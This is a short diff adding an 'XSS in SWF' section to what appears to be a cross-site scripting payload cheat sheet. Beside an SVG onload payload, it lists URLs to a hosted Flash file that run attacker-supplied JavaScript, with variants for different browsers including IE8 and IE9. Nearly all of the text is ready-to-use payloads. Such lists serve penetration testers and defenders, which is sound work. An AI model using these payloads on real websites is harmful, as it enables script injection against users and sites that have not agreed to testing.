@@ -136,7 +136,16 @@ XSS in SVG (short)
 ```
 <svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
 ```
+
+XSS in SWF
+```
+Browsers other than IE: http://0me.me/demo/xss/xssproject.swf?js=alert(document.domain);
+IE8: http://0me.me/demo/xss/xssproject.swf?js=try{alert(document.domain)}catch(e){ window.open(‘?js=history.go(-1)’,’_self’);}
+IE9: http://0me.me/demo/xss/xssproject.swf?js=w=window.open(‘invalidfileinvalidfileinvalidfile’,’target’);setTimeout(‘alert(w.document.location);w.close();’,1);
+```
+
 more payloads in ./files
+
 
 
 ## XSS with Relative Path Overwrite - IE 8/9 and lower
